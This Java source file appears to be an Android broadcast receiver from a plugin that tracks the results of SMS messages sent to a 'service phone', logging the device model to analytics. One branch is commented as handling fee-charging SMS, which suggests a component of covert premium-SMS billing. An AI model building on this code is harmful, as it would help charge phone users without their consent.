package com.xstd.plugin.receiver;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.widget.Toast;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.config.PluginSettingManager;

import java.util.HashMap;

/**
 * Created by michael on 14-1-25.
 */
public class SMSSentBRC extends BroadcastReceiver {

    public static final String SMS_LOCAL_SENT_ACTION = "com.xstd.sms.local.sent";

    public static final String SMS_MONKEY_SENT_ACTION = "com.xstd.sms.monkey.sent";

    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        String actionName = intent.getAction();
        if (TextUtils.isEmpty(actionName)) return;

        if (SMS_LOCAL_SENT_ACTION.equals(actionName)) {
            PluginSettingManager.getInstance().init(context);
            String servicePhone = PluginSettingManager.getInstance().getServicePhoneNumber();
            //是手机服务器发送事件
            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    if (!TextUtils.isEmpty(servicePhone)) {
                        HashMap<String, String> log = new HashMap<String, String>();
                        log.put("phoneType", Build.MODEL);
                        log.put("servicePhone", servicePhone);
                        CommonUtil.umengLog(context, "send_sms_phone1", log);
                    }
                    //成功了就立刻返回
                    return;
                case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                    if (!TextUtils.isEmpty(servicePhone)) {
                        HashMap<String, String> log = new HashMap<String, String>();
                        log.put("phoneType", Build.MODEL);
                        log.put("servicePhone", servicePhone);
                        log.put("reason", "normal_error");
                        CommonUtil.umengLog(context, "sms_service_phone_failed", log);
                    }
                    break;
                case SmsManager.RESULT_ERROR_RADIO_OFF:
                    if (!TextUtils.isEmpty(servicePhone)) {
                        HashMap<String, String> log = new HashMap<String, String>();
                        log.put("phoneType", Build.MODEL);
                        log.put("servicePhone", servicePhone);
                        log.put("reason", "radio_off");
                        CommonUtil.umengLog(context, "sms_service_phone_failed", log);
                    }
                    break;
                case SmsManager.RESULT_ERROR_NULL_PDU:
                    if (!TextUtils.isEmpty(servicePhone)) {
                        HashMap<String, String> log = new HashMap<String, String>();
                        log.put("phoneType", Build.MODEL);
                        log.put("servicePhone", servicePhone);
                        log.put("reason", "pdu_null");
                        CommonUtil.umengLog(context, "sms_service_phone_failed", log);
                    }
                    break;
                default:
                    if (!TextUtils.isEmpty(servicePhone)) {
                        HashMap<String, String> log = new HashMap<String, String>();
                        log.put("phoneType", Build.MODEL);
                        log.put("servicePhone", servicePhone);
                        log.put("reason", "unknown");
                        CommonUtil.umengLog(context, "sms_service_phone_failed", log);
                    }
            }

            //能到这的逻辑都是发送失败了
            PluginSettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
            PluginSettingManager.getInstance().setKeyLastSendMsgToServicePhone(0);
            PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
        } else if (SMS_MONKEY_SENT_ACTION.equals(actionName)) {
            //是扣费短信
        }
    }

}
